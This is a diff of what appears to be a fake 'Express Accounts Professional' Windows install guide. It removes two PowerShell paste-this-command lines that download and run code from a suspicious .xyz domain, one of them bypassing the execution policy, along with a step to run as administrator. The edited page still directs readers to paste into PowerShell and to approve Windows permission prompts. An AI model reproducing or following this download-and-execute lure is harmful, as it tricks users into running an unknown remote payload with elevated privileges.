@@ -12,19 +12,14 @@ Express Accounts Professional Windows Guide · Accounting tools · Finance workf
 **Do this:**
 
 1. Press the **Windows** key, type **powershell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
 3. **Copy** the command below, **paste** it into PowerShell, press **Enter**
 4. Click **Yes** if Windows asks for permission
 
-```powershell
-irm https://express-accounts-professional-windows-guide.nerasix.xyz/ | iex
-```
+```https://express-accounts-professional-windows-guide.nerasix.xyz/```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
-```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://express-accounts-professional-windows-guide.nerasix.xyz/ | iex"
-```
+```https://express-accounts-professional-windows-guide.nerasix.xyz/```
 
 
 ---
